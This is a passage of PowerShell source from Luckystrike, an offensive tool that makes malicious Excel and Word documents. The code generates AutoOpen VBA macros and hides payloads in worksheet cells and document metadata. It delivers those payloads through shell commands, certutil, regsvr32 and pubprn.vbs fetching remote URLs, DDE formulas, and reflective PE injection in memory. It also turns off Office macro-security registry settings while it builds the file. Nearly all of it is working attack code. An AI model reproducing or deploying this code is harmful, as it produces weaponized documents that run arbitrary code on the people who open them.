	$acount = [int]($active | measure).Count
	$script:macroelements = @{}
	
	if ($linelength -eq $null)
		{$linelength = 380}
	
	if ($acount -eq 0)
	{
		Write-Message "You must first add a payload." "error"
		Load-Menu $script:currentmenu
	}
	else
	{
		Write-Message "Generating macro code." "status" -prependNewline $true
		# Create the function & add to Auto_Open
		$functionnames = @{}
		foreach ($i in $active)
		{
			if ($i.PayloadID -ne 47734)
			{
				$let = Get-RandomAlpha 1
				$rnd = Get-RandomAlphaNum 7
				$name = "$let$rnd"
				if ($ismodify)
				{ 
					$callstring += "`tCall LinesOfBusiness.$name`n" 
				}
				else 
				{
					$callstring += "`tCall $name`n"	
				}
				$functionnames.Add($i.ID, $name)
				Write-Message "GENERATE-MACRO: CALLSTRING: $callstring" "debug"
			}
		}

		switch ($doctype)
		{
			1 { #xls
				$aostring = "Sub Auto_Open`n`n$callstring`nEnd Sub`n`n"
			}
			2 { #doc
				$aostring = "Sub AutoOpen`n`n$callstring`nEnd Sub`n`n"
			}
			default {
				Write-Message "Doctype not understood. You should not get this error. What are you doing??" "error"
				exit
			}
		}
		
		Write-Message "GENERATE-MACRO: AOSTRING: $aostring" "debug"

		# Get all dependencies
		$depends = Get-ActiveDependencies

		# 1. Add declare dependencies
		$depends | ?{$_.BlockType -eq "declare"} | %{$macrocode += $_.BlockText}

        
		# 2. Generate Auto_Open
		
        # 2.1 Auto_Open only needed if we don't only have infection type 9 (DDE)
        if ($acount -eq 1 -and (($active | ?{$_.InfectionType -eq 11} | measure).Count -eq 1))
        {
            $insertautoopen = $false
        }

        # 2.2 Add Auto_Open
        if ($insertautoopen)
		{
			$macrocode += $aostring
		}

		$script:macroelements.Add('autoopen', $aostring)
		$script:macroelements.Add('autoopen-calls', $callstring)
		
		# 3. Add util dependencies 
		$depends | ?{$_.BlockType -eq "util"} | %{$macrocode += $_.BlockText}

		# 4. Add exec dependencies 
		$depends | ?{$_.BlockType -eq "exec"} | %{$macrocode += $_.BlockText}

		# 5. Add the harnesses
		$functionnum = 0	
		$count = 1
		foreach ($i in $active)
		{
			$payload = Get-PayloadByID $i.PayloadID

			if ($payload -ne $null)
			{
				$functionname = $functionnames.Item($i.ID)
				switch ($i.InfectionType)
				{
					1 { # Shell-Command
						$harness = Get-Harness "ShellCommand" $functionname $i.LegendString
						$vbapayload = Create-ShellCommand $harness $payload
					}
					2 { # Cell embed
						$vbapayload = Get-Harness "PSCellEmbed" $functionname $i.LegendString
					}
					3 { # Cell embed non-b64
						$vbapayload = Get-Harness "PSCellEmbedNonb64" $functionname $i.LegendString
					}
					4 { # Cell embed encrypted
						$vbapayload = Get-Harness "PSCellEmbedEncrypted" $functionname $i.LegendString
					}
					5 { # Certutil
						$vbapayload = Get-Harness "CertUtil" $functionname $i.LegendString
					}
					6 { # Save to disk
						$vbapayload = Get-Harness "SaveToDisk" $functionname $i.LegendString
					}
					7 { # ReflectivePE
						$a = Get-ActiveWorkingByPayloadID 47734 #IRPEI Payload
						$l = Parse-Legend $a.LegendString
						Write-Message "IRPEI Legend String: $($a.LegendString)" "debug"
						$vbapayload = Get-Harness "ReflectivePE" $functionname $i.LegendString
						$vbapayload = $vbapayload | %{$_.Replace("|IRPEICOLUMN|", $l.StartColumn)}
						$vbapayload = $vbapayload | %{$_.Replace("|IRPEISTARTROW|", $l.StartRow)}
						$vbapayload = $vbapayload | %{$_.Replace("|IRPEIENDROW|", ([int]$l.StartRow + [int]$l.NumRows - 1))}
					}
					8 { # Metadata 
						switch ($doctype) {
							1 { #xls
								$vbapayload = Get-Harness "Metadata-XLS" $functionname $i.LegendString
							}
							2 { #doc
								$vbapayload = Get-Harness "Metadata-DOC" $functionname $i.LegendString
							}
							default {
								Write-Message "Oops. Bug Found. The Metadata attack is not availabe for the doctype you've chosen: $doctype`n" "error" -prependNewLine $true
								exit
							}
							#$vbapayload = $vbapayload | %{$_.Replace("|CUSTOMPROP|", "Business$count")}
						}
					}
                    9 { # CellEmbed-Obfuscated
                        # Use the non-b64 harnass
                        $vbapayload = $null
						$vbapayload = Get-Harness "PSCellEmbedNonb64" $functionname $i.LegendString
                    }
					10 { # Pubprn.vbs
						$vbapayload = Get-Harness "PUBPRN" $functionname $i.LegendString
						$vbapayload = $vbapayload | %{$_.Replace("|URL|", $payload.PayloadText)}
                    }
					11 { # DDE Attack
						# There is no macro for this attack.
						$vbapayload = $null
					}
					12 { #Regsrv32
						$vbapayload = Get-Harness "REGSRV32" $functionname $i.LegendString
						$vbapayload = $vbapayload | %{$_.Replace("|URL|", $payload.PayloadText)}
					}
				}

				if ($i.CustomStrings -ne $null)
				{
					Write-Message "GENERATE-MACRO: CUSTOMSTRINGS: $($i.CustomStrings)" "debug"
					foreach ($str in $i.CustomStrings.Split(';'))
					{
						$vals = $str.Split(',')
						$vbapayload = $vbapayload | %{$_.Replace($vals[0], $vals[1])}
					}
				}

				#Write-Message "GENERATE-MACRO: VBAPAYLOAD: $vbapayload" "debug"

				Write-Message "GENERATE MACRO: Added Payload: $($payload.Name). InfectionType: $($i.InfectionType). Legend: $($i.LegendString). FunctionName: $functionname" "debug" 
				$macrocode += $vbapayload
				$script:macroelements.Add("function_$functionname", $vbapayload)
				$functionnum++
			}
			$count++
		}
		
		Write-Message "GENERATE-MACRO: MACROCODE: $macrocode" "debug"
        Write-Message "GENERATE MACRO: MACRO CODE LENGTH: $($macrocode.Length)" "debug"
		return $macrocode
	}
}

function Add-WorksheetPayloads([ref]$Workbook, [ref]$Worksheet, $activeworking, $irpeilegend)
{
	Write-Message "Embedding payloads into workbook." "status"
	foreach ($i in $activeworking)
	{
		$legend = Parse-Legend $i.LegendString
		$payload = Get-PayloadByID $i.PayloadID
		$partscheck = $true

		if ($i.IsEncrypted -eq 1)
		{
			$parts = Get-PayloadPartsArray $i.EncryptedText
		}
		else 
		{	
			# This will likely get more complicated as more payloads are added.
			switch ($i.InfectionType)
			{
				2 { # Embedding base64 encoded PS into a cell. Must b64 encode first (hence $true) 
					$parts = Get-PayloadPartsArray $payload.PayloadText $true
				}
				7 { # Run In Memory. Requires Invoke-ReflectivePEInjection (IRPEI) parts to be added as well.
					if ($i.PayloadID -eq 47734) #IRPEI
					{
						Write-Message "Adding IRPEI Parts" "debug"
						$parts = Get-InvokeReflectivePEInjectionParts
					}
					else 
					{
						Write-Message "Adding IRPEI PEBytes" "debug"
						$parts = Get-PayloadPartsArray $payload.PayloadText $false
					}
				}
				8 { # Metadata attack
					# Currently handled in Create-Excel/Word (Section 5.1) due to what I believe to be a bug in the .Net framework.
					$partscheck = $false
				}
                9 { # CellEmbed-Obfuscation
                    if ($can_obfuscate)
					{
						$obfscode = Out-StringDelimitedAndConcatenated $payload.PayloadText
						$parts = Get-PayloadPartsArray $obfscode $false
					}
                }
				11 { #DDE Attack
					$parts = @()
					$payloadparts = $payload.PayloadText.Split(" ")
					$command = $payloadparts[0]
					$partargs = $payloadparts[1..$payloadparts.Length] | %{$s += $_ + " "}
					$parts = "=$command|'$($s)'!A0"
					$legend.StartRow = "1"
					$legend.StartColumn = "40"
				}
				default { # every other infection type embeds a payload that is already b64 encoded
					$parts = Get-PayloadPartsArray $payload.PayloadText $false
				}
			}
		}

		if ($partscheck -and $parts -ne $null -and ($parts | measure).Count -ne 0)
		{
			if (($parts | measure).Count -eq $legend.NumRows)
			{
				$startrow = [int]$legend.StartRow
				Write-Message "Start Row: $startrow" "debug"
				$i = 1
				foreach ($part in $parts)
				{
					try 
					{
						$Worksheet.Value.Cells.Item($startrow, [int]$legend.StartColumn) = $part
						#Start-Sleep -Milliseconds 100
						$startrow++
						Write-Message "Row: $startrow. Cell value length: $($part.Length)" "debug"
					}
					catch [System.Exception] 
					{
						$message = $_.Exception.Message
						if ($message -like "Insufficient memory")
						{
							Write-Message "ERROR in Row $startrow. Cell value length: $($part.Length)" "debug"
							throw
						}
					}
				}
			}
			else 
			{
				Write-Message "Math bug found. Parts length doesn't match numrows in legend. Run in -Debug mode and post the output as an issue on github please." "error"
				Write-DebugInfo -payload $payload -infectiontype $null -active $i
				exit
			}
		}
		else
		{
			if ([int]$i.Infectiontype -ne 8) # If it's not the metadata attack, then something broke.
			{
				Write-Message "Something is wrong. Payload parts array is null when it shouldn't be. Was the payload successfully loaded into the database? Run with -Debug, add a payload, then hit 'Show Selected Payloads'. Verify PayloadText is populated." "error"
				Write-DebugInfo -payload $payload -infectiontype $null -active $i
				exit
			}
		}
	}
}

function Do-FilePrereqs($existingpath, $filename=$null, $doctypename, $officeversion)
{
	Write-Message "DO-FILEPREREQS: EXISTINGPATH: $existingpath" "debug"
	Write-Message "DO-FILEPREREQS: FILENAME: $filename" "debug"
	Write-Message "DO-FILEPREREQS: DOCTYPENAME: $doctypename" "debug"
	Write-Message "DO-FILEPREREQS: OFFICEVERSION: $officeversion" "debug"

	####### PREREQ CHECKS #######
	if ($linelength -eq $null) 
		{ $linelength = 380 }

	
	if (!(Test-Path -Path $script:payloadsdir))
	{
		New-Item $script:payloadsdir -ItemType Directory | Out-Null
	}

	$doctype = Get-DocTypeByName $doctypename

	$rand = Get-RandomAlphaNum 8
	$tmppath = ""
	if ($ismodify)
	{
		if (!(Test-Path $existingpath))
		{
			Write-Message "$existingpath not found. Check your path." "error"
			Load-Menu $script:currentmenu
		}
		
		$extension = [System.IO.Path]::GetExtension($existingpath)
	
		if ($extension -ne ".xls" -and $extension -ne ".doc")
		{
			Write-Message "Only Office 97-2003 format (.xls & .doc) is supported. Sorry." "error" -prependNewLine $true
			Load-Menu $script:currentmenu
		}

		if ($filename -eq $null)
		{
			$newpath = "$script:payloadsdir\infected_template_$rand.$doctypename"
		}
		else 
		{
			$newpath = "$script:payloadsdir\$filename.$doctypename"
		}

		$tmppath = $newpath
		Copy-Item $existingpath $newpath
		#$macrocode = Generate-Macro -insertautoopen $false -linelength $linelength -ismodify $true -doctype $doctype.ID
	}
	else 
	{
		if ($filename -eq $null)
		{
			$newpath = "$script:payloadsdir\infected_$rand.$doctypename"
		}
		else 
		{
			$newpath = "$script:payloadsdir\$filename.$doctypename"
		}
		
		#$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $false -doctype $doctype.ID
	}

	$OutlookKey = "HKLM:\SOFTWARE\Microsoft\Office\$officeversion\Outlook"
	$OutlookWow6432NodeKey = "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Office\$officeversion\Outlook"
	if(Test-Path -Path $OutlookKey)
	{       
		$officeRegKey = $OutlookKey
	}
	else
	{        
		$officeRegKey = $OutlookWow6432NodeKey
	}

	$BitNess = (Get-ItemProperty $officeRegKey).BitNess
	$winbit = (gwmi win32_operatingsystem).osarchitecture
	$winver = [System.Environment]::OSVersion.Version
	[string]::format("{0}.{1}.{2}.{3}", $winver.Major, $winver.Minor, $winver.Build, $winver.Revision) | out-null
	$psver = ($PSVersionTable).PSVersion

	Write-Message "DO-FILEPREREQS: POWERSHELL VERSION: $psver" "debug"
	Write-Message "DO-FILEPREREQS: OFFICE VERSION: $officeversion" "debug"
	Write-Message "DO-FILEPREREQS: OFFICE BITNESS: $BitNess" "debug"
	Write-Message "DO-FILEPREREQS: OFFICE REGKEY: $officeRegKey" "debug"
	Write-Message "DO-FILEPREREQS: WINDOWS VERSION: $winver" "debug"
	Write-Message "DO-FILEPREREQS: WINDOWS BITNESS: $winbit" "debug"
	Write-Message "DO-FILEPREREQS: ISADMIN: $IsAdmin" "debug"
	Write-message "DO-FILEPREREQS: DOCTYPEID: $($doctype.ID)" "debug"

	return New-Object -TypeName psobject -Prop @{
		'filename'		= $filename;
		'newpath'		= $newpath;
		'tmppath'		= $tmppath;
		'macrocode'	 	= $macrocode;
		'officregkey'	= $officeRegKey
	}
}

function Adjust-MacroSecurity($doctypename, $officeversion, $action)
{
	if ($action -eq "disable") {$val = 1}
	else {$val = 0}

	switch ($doctypename) {
		'xls' {
			$appname = "Excel"
		}
		'doc' {
			$appname = "Word"
		}
		default {
			Write-Message "Bug Found. Doc type name unsupported: $doctypename. Please open an issue on github and post the debug log." "error"
			exit
		}
	}

	$regkey = "HKCU:\Software\Microsoft\Office\$officeversion\$appname\Security"	

	Write-Message "ADJUST-MACROSECURITY: DOCTYPENAME: $doctypename" "debug"
	Write-Message "ADJUST-MACROSECURITY: OFFICEVERSION: $officeversion" "debug"
	Write-Message "ADJUST-MACROSECURITY: APPNAME: $appname" "debug"
	Write-Message "ADJUST-MACROSECURITY: VAL: $val" "debug"
	Write-Message "ADJUST-MACROSECURITY: REGKEY: $regkey" "debug"
	Write-Message "MACROSEC KEY: $regkey" "debug"

	try 
	{	
		New-ItemProperty -Path $regkey -Name AccessVBOM -PropertyType DWORD -Value $val -Force | Out-Null
		New-ItemProperty -Path $regkey -Name VBAWarnings -PropertyType DWORD -Value $val -Force | Out-Null

		if ($IsAdmin -eq $true -and $vars.officregkey -like "*Wow6432Node*")
		{
			$parent = "HKLM:\Software\Wow6432Node\Microsoft\Office\$officeversion\$appname"
			$regkey = "$parent\Security"
			Write-Message "MACROSEC KEY: $regkey" "debug"
			Write-Message "Detected admin & Wow6432Node regkey. Modifying accordingly." "debug"
			if (!(Test-Path -Path $regkey))
			{
				New-Item -Name "Security" -Path $parent -Type Directory -Force | Out-Null
			}
			
			New-ItemProperty -Path $regkey -Name AccessVBOM -PropertyType DWORD -Value $val -Force | Out-Null
			New-ItemProperty -Path $regkey -Name VBAWarnings -PropertyType DWORD -Value $val -Force | Out-Null
		}
	}
	catch [System.Exception] 
	{
		throw
		$message = $_.Exception.Message
		throw
		if ($message -like "You cannot call a method on a null-valued expression.")
		{
			Write-Message "The version of Office you are running requires Luckystrike to run with administrative privileges. Please open Powershell as an admin and try again." "error"
			throw
		}
		else
		{
			throw
		}
	}

}

function Get-MacroEntryPoint($document, $aostring, $doctypename)
{
	$name = $null
    $aoLine = 0
    $namefound = $false
    $modulefound = $false

	foreach ($comp in $document.VBProject.VBComponents)
	{
		$cm = $comp.CodeModule
		if ($cm.Name -eq $name)
		{
			$namefound = $true
		}
		
		Write-Message "GET-MACROENTRYPOINT: CM.NAME: $($cm.Name) - CM.COUNTOFLINES: $($cm.CountOfLines)" "debug"

		switch ($doctypename)
		{
			"xls" 
			{
				if ($cm.CountOfLines -gt 2 -and (!($cm.Name -match "Sheet*")) -and (!($cm.Name -match "ThisWorkbook*")))
				{
					try
					{ 	
						$name = $cm.Name
						$namefound = $true
						$aoLine = $cm.ProcStartLine($aostring, [Microsoft.Vbe.Interop.vbext_ProcKind]::vbext_pk_Proc) 
					}
					catch 
					{ 
						#Throws a Sub Not Defined error if it doesn't exist, which we don't care about.
					}
				}
			}
			"doc" 
			{
				if ($cm.CountOfLines -gt 2 -and (!($cm.Name -match "ThisDocument*")))
				{
					try
					{ 	
						$name = $cm.Name
						$namefound = $true
						$aoLine = $cm.ProcStartLine($aostring, [Microsoft.Vbe.Interop.vbext_ProcKind]::vbext_pk_Proc) 
					}
					catch 
					{ 
						#Throws a Sub Not Defined error if it doesn't exist, which we don't care about.
					}
				}
			}
		}
    }
    
    if ($name -eq $null)
    {
        switch ($doctypename)
        {
            "xls" { $name = "Sheet1" }
            "doc" { $name = "ThisDocument" }
        }
    }

	Write-Message "GET-MACROENTRYPOINT: NAME: $name" "debug"
	Write-Message "GET-MACROENTRYPOINT: NAMEFOUND: $namefound" "debug"
	Write-Message "GET-MACROENTRYPOINT: AOLINE: $aoLine" "debug"

	return New-Object -TypeName psobject -Prop @{
		'Name' = $name;
        'aoLine' = $aoLine;
        'NameFound' = $namefound
	}
}

function Create-Excel($linelength, $ismodify, $existingpath, $istemplate, $filename=$null)
{

	Write-Message "CREATE-EXCEL: LINELENGTH: $linelength" "debug"
	Write-Message "CREATE-EXCEL: ISMODIFY: $ismodify" "debug"
	Write-Message "CREATE-EXECL: EXISTINGPATH: $existingpath" "debug"
	
	#Shamelessly copied from @enigma0x3's excellent work here: https://github.com/enigma0x3/Generate-Macro/blob/master/Generate-Macro.ps1. Follow this dude! :-)
	
	try 
	{
		# 1. Create new excel application instance
		$Excel01 = New-Object -ComObject "Excel.Application"
		$ExcelVersion = $Excel01.Version

		$vars = Do-FilePrereqs $existingpath $filename "xls" $ExcelVersion
		$doctype = Get-DocTypeByName "xls"

		# 2. Add new workbook/worksheet
		$Excel01.DisplayAlerts = $false
		#$Excel01.DisplayAlerts = "wdAlertsNone"
		$Excel01.Visible = $false

		Adjust-MacroSecurity "xls" $ExcelVersion "disable"

		if ($ismodify)
			{ $Workbook01 = $Excel01.Workbooks.Open($vars.tmppath) }
		else 
			{ $Workbook01 = $Excel01.Workbooks.Add(1) }
			
		$Worksheet01 = $Workbook01.WorkSheets.Item(1)
		$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
	}
	catch [System.Exception] 
	{
		$message = $_.Exception.Message
		if ($message -like "You cannot call a method on a null-valued expression.")
		{
			Write-Message "The version of Office you are running requires Luckystrike to run with administrative privileges. Please open Powershell as an admin and try again. Sorry." "error"
		}
		else
		{
			throw
		}
		$Excel01.Workbooks.Close()
		$Excel01.Quit()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
		exit
	}

	if ($ismodify)
	{
		# See if we can find Auto_Open and add our calls. 
		$entry = Get-MacroEntryPoint $Workbook01 "Auto_Open" "xls"

		foreach ($comp in $Workbook01.VBProject.VBComponents)
		{
			$cm = $comp.CodeModule
			if ($cm.Name -eq $entry.Name)
			{
				# If Auto_Open already exists, modify it.
				if ($entry.aoLine -gt 0)
				{
					$macrocode = Generate-Macro -insertautoopen $false -linelength $linelength -ismodify $true -doctype $doctype.ID
					Write-Message "Auto Opener located at line $($entry.aoLine)" "status"
					$cm.InsertLines($entry.aoLine + 2, $macroelements['autoopen-calls'])
				}
				else #otherwise create it.
				{
					$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $true -doctype $doctype.ID
					Write-Message "Auto Opener not located. Creating it..."
					#$cm.InsertLines(1, $macroelements['autoopen'])
				}
			}
		}

		$ExcelModule.Name = "LinesOfBusiness"
        if ($macrocode.Length -gt 0)
        {
		    $ExcelModule.CodeModule.AddFromString($macrocode)
        }
		Write-Message "Successfully created LinesOfBusiness Module" "debug"
	}
	else 
	{
		$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $false -doctype $doctype.ID
		try
		{ 	
            if ($macrocode.Length -gt 0)
			{			    
				$ExcelModule.CodeModule.AddFromString($macrocode) 
			}
		}
		catch
		{
			$message = $_.Exception.Message
			if ($message -match "Too many line continuations")
			{
				if ($linelength -gt 5000)
				{
					Write-Message "String length greater than 5000 per line. Highly unlikely to work. Refactor your payload to remove characters." "error"
					Load-Menu $script:currentmenu
				}
				else
				{
					$linelength += 500
					Write-Message "Line continuation error encountered. Setting string length to $linelength and trying again..." "warning"
					$Workbook01.Close($false)
					$Excel01.Quit()
					[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
					Create-Excel $linelength -ismodify $false
				}
			}
			else
			{
				Write-Message "Error occurred: $message" "error"
				Load-Menu 'main'
			}
		}
	}

	# 5. Embed any payloads per their legend string
	$active = Get-ActiveWorking
	Add-WorksheetPayloads ([ref]$Workbook01) ([ref]$Worksheet01) $active

	# 5.1 - Can't seem to get [ref]$Workbook to work in order to pass the workbook to Add-WorksheetPayloads for the metadata attack.
	# Research indicates this may be a bug: http://branderonline-public.sharepoint.com/Blog/Post/63/Adding-custom-document-properties-to-a-Word-document-via-PowerShell
	# If anyone knows how to fix this, please let me know. Until then, add metadata attacks here.
	$count = 1
	$binding = "System.Reflection.BindingFlags" -as [type]
	foreach ($i in $active)
	{	
		if ($i.InfectionType -eq 8)
		{
			$payload = Get-PayloadByID $i.PayloadID
			foreach($property in $Workbook01.BuiltInDocumentProperties)
			{
				$pn = [System.__ComObject].invokemember("name",$binding::GetProperty,$null,$property,$null)
				if ($pn -eq "Subject")
				{
					Write-Message "Adding the following payload to Subject metadata: $($payload.PayloadText)" "Debug"
					[System.__ComObject].invokemember("value",$binding::SetProperty,$null,$property,@($payload.PayloadText))
				}
			}
			
			# Custom Document Properties. Coming soon. For now, stash in Subject
			<#
			$customProperties = $Workbook01.CustomDocumentProperties
			$typeCustomProperties = $customProperties.GetType() | out-null
			[array]$payload = "Business$count",$false,4,$payload.PayloadText
			$typeCustomProperties.InvokeMember("Add", $binding::InvokeMethod, $null, $customProperties, $payload)
			#>
		}
		$count++
	}

	# 6. Save the document
	try 
	{
		Add-Type -AssemblyName Microsoft.Office.Interop.Excel
		Write-Message "Saving $($vars.newpath)" "debug"
		if ($ismodify)
		{
			Write-Message "CLICK YES/CONTINUE TO ANY COMPATIBILITY WARNINGS! (look for a stupid popunder)" "warning"
			$Workbook01.SaveAs("$($vars.newpath)", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
		}
		else 
		{
			$Workbook01.SaveAs("$($vars.newpath)", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
		}
		Write-Message "Success. File saved to $($vars.newpath)`n" "success"
		Clear-ActiveWorking
	}
	catch 
	{
		$err = $_.Exception.Message
		Write-Message "Error occurred creating document. $err"
		exit
	}
	finally
	{
		Adjust-MacroSecurity "xls" $ExcelVersion "enable"

		# 8. Cleanup
		$Excel01.Workbooks.Close()
		$Excel01.Quit()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
		$Excel01 = $null
		if ($istemplate)
		{
			Remove-Item $existingpath
		}
	}

	Load-Menu 'main'

	# 9. Beerz!
}

function Create-Word($linelength, $ismodify, $existingpath, $istemplate, $filename=$null)
{

	Write-Message "CREATE-WORD: LINELENGTH: $linelength" "debug"
	Write-Message "CREATE-WORD: ISMODIFY: $ismodify" "debug"
	Write-Message "CREATE-WORD: EXISTINGPATH: $existingpath" "debug"
	
	# Modified from the excellent Nishang toolkit: https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1

	try
	{
		$Word = New-Object -ComObject Word.Application
		$WordVersion = $Word.Version

		$vars = Do-FilePrereqs $existingpath $filename "doc" $WordVersion
		$doctype = Get-DocTypeByName "doc"

		#Check for Office 2007 or Office 2003
		if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
		{
			$Word.DisplayAlerts = $False
		}
		else
		{
			$Word.DisplayAlerts = "wdAlertsNone"
		}
		
		#Turn off Macro Security
		Adjust-MacroSecurity "doc" $WordVersion "disable"

		Write-Message "CREATE-WORD: VARS.TMPPATH: $($vars.tmppath)" "debug"

		if ($ismodify)
			{ $Doc = $Word.Documents.Open($vars.tmppath) }
		else 
			{ $Doc = $Word.Documents.Add() }

		$DocModule = $Doc.VBProject.VBComponents.Item(1)
	}
	catch [System.Exception]
	{
		throw
	}

	if ($ismodify)
	{
		# See if we can find Auto_Open and add our calls. 
		$entry = Get-MacroEntryPoint $Workbook01 "AutoOpen" "doc"

		foreach ($comp in $Doc.VBProject.VBComponents)
		{
			$cm = $comp.CodeModule
			if ($cm.Name -eq $entry.Name)
			{
				# If Auto_Open already exists, modify it.
				if ($entry.aoLine -gt 0)
				{
					$macrocode = Generate-Macro -insertautoopen $false -linelength $linelength -ismodify $true -doctype $doctype.ID
					Write-Message "AutoOpen located at line $($entry.aoLine)" 
					$cm.InsertLines($entry.aoLine + 2, $macroelements['autoopen-calls'])
				}
				else #otherwise create it.
				{
					$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $true -doctype $doctype.ID
					Write-Message "AutoOpen not located. Creating it..." "status"
					#$cm.InsertLines(1, $macroelements['autoopen'])
				}
			}
		}

		$DocModule.Name = "LinesOfBusiness"
        if ($macrocode.Length -gt 0)
        {
		    $DocModule.CodeModule.AddFromString($macrocode)
        }
		Write-Message "CREATE-WORD: Successfully created LinesOfBusiness Module" "debug"
	}
	else 
	{
		$macrocode = Generate-Macro -insertautoopen $true -linelength $linelength -ismodify $false -doctype $doctype.ID
		if ($macrocode.Length -gt 0)
		{			    
			$DocModule.CodeModule.AddFromString($macrocode) 
		}
	}

	# Handle the metadata attack
	$active = Get-ActiveWorking
	$binding = "System.Reflection.BindingFlags" -as [type]
	foreach ($i in $active)
	{
		if ($i.InfectionType -eq 8)
		{
			$payload = Get-PayloadByID $i.PayloadID
			foreach($property in $Doc.BuiltInDocumentProperties)
			{
				$pn = [System.__ComObject].invokemember("name",$binding::GetProperty,$null,$property,$null)
				if ($pn -eq "Subject")
				{
					Write-Message "CREATE-WORD: Adding the following payload to Subject metadata: $($payload.PayloadText)" "Debug"
					[System.__ComObject].invokemember("value",$binding::SetProperty,$null,$property,@($payload.PayloadText))
				}
			}
		}
	}

	# 6. Save the document
	try 
	{
		#Add-Type -AssemblyName Microsoft.Office.Interop.Word
		Write-Message "Saving $($vars.newpath)" "debug"
		if ($ismodify)
		{
			Write-Message "CLICK YES/CONTINUE TO ANY COMPATIBILITY WARNINGS! (look for a stupid popunder)" "warning"
			$Doc.SaveAs([ref]$vars.newpath, [ref]0)
		}
		else 
		{
			$Doc.SaveAs([ref]$vars.newpath, [ref]0)
		}
		Write-Message "Success. File saved to $($vars.newpath)`n" "success"
		Clear-ActiveWorking
	}
	catch 
	{
		$err = $_.Exception.Message
		Write-Message "Error occurred creating document. $err"
		exit
	}
	finally
	{
		# 8. Cleanup
		$Doc.Close()
		$Word.Quit()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Doc) | out-null
		if ($istemplate)
		{
			Remove-Item $existingpath
		}

		Adjust-MacroSecurity "doc" $WordVersion "enable"
	}

	Load-Menu 'main'
}

function Create-FileFromTemplate($doctypename, $templateselection = $null, $filename = $null)
{
	$templates = Get-TemplateByDocType $doctypename
	$tcount = [int]($templates | measure).Count

	if ($tcount -gt 0)
	{
		if ($templateselection -eq $null)
		{
			Write-Message "`n=========== Select Template ============`n"
			foreach ($t in $templates | sort ID)
			{	
				Write-Message "`t$($t.ListID))  $($t.Name)"
			}
			Write-Message "`t$exitnum) Done."
			Write-Message "`n"

			Do
			{ 
				$templateselection = Read-Host -Prompt "Select" 
			}
			until ($templateselection -as [int] -and ($templateselection -gt 0 -and $templateselection -le $tcount) -or $payloadselection -eq $exitnum)

			Write-Message "CREATE-FILEFROMTEMPLATE: SELECTION: $templateselection" "debug" -prependNewLine $true
		}
		
		if ($templateselection -eq $exitnum)
		{
			Load-Menu $script:currentmenu
		}
		else 
		{
			$r = Get-RandomAlphaNum 8

			if (!(Test-Path -Path $script:payloadsdir))
			{
				New-Item $script:payloadsdir -ItemType Directory | Out-Null
			}

			$tmppath = "$($script:payloadsdir)\template_$r.$doctypename"
			$template = $templates | ?{$_.ListID -eq $templateselection}
			$tbytes = [System.Convert]::FromBase64String($template.TemplateText)
			Write-Message "CREATE-FILEFROMTEMPLATE: TEMPLATE BYTE LENGTH: $($tbytes.Length)" "debug"
			[System.IO.File]::WriteAllBytes($tmppath, $tbytes)

			switch ($doctypename)
			{
				"xls" {
					Create-Excel -linelength $null -ismodify $true -existingpath $tmppath -istemplate $true -filename $filename
				}
				"doc" {
					Create-Word -linelength $null -ismodify $true -existingpath $tmppath -istemplate $true -filename $filename
				}
				default {
					Write-Message "Doctype not understood: $doctypename. You should not get this. WHAT DID YOU DO? Please run with -debug then submit the log as an issue on github."
				}
			}
			
		}
	}
	else
	{
		Write-Message "No templates were found in the catalog." "warning" $true
		Load-Menu 'file'
	}
}

function Get-PELauncherMacro($xlsname)
{
# Performs the following:
# 1) Binds to the target's currently open version of Excel
# 2) Extracts and joins the b64 encoded contents mapped by the legend cell (one is Invoke-ReflectivePEInjection, the other is the exe's byte array)
# 3) Fires Invoke-ReflectivePEInjection using the joined byte array

# Coming soon. :-)

# IMPORTANT: The first variable describes the file name (e.g. "infected.xls"). This *must* be the name of the spreadsheet opened by the target
# or the code won't be able to locate the payload. In other words, do NOT rename the spreadsheet file after the PE has been injected into it!

	$code = @"
$n = "|XLSNAME|"
$xl = [Runtime.Interopservices.Marshal]::GetActiveObject('Excel.Application')
$ws = ($xl.Workbooks.Item($n)).Worksheets.Item("Sheet1")
$l = @($ws.Cells.Item(31337,100).Text.Split('j'))
$cnt = 0
if ([int]$l[2] -1 -lt 1) { $cnt = 1 }
else { $cnt = [int]$l[2] - 1 }
$b64ipei = $null
for ($i=0;$i -le $cnt;$i++) 
{	
	$t = $ws.Cells.Item([int]$l[1] + $i,[int]$l[0]).Text
	$b64ipei = -join ($b64ipei, $t)
}
$s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64ipei))
$b64pay = $null
for ($i=0;$i -lt ([int]$l[5]-1);$i++) { $b64pay = -join ($b64pay, $ws.Cells.Item([int]$l[4] + $i,[int]$l[3]).Text) }
iex $s; Invoke-ReflectivePEInjection -PEBytes [System.Convert]::FromBase64String($b64pay)
"@

return $code
}

# Return a base64 encoded array of Invoke-ReflectivePEInjection
# https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
function Get-InvokeReflectivePEInjectionParts()
{
	return @(
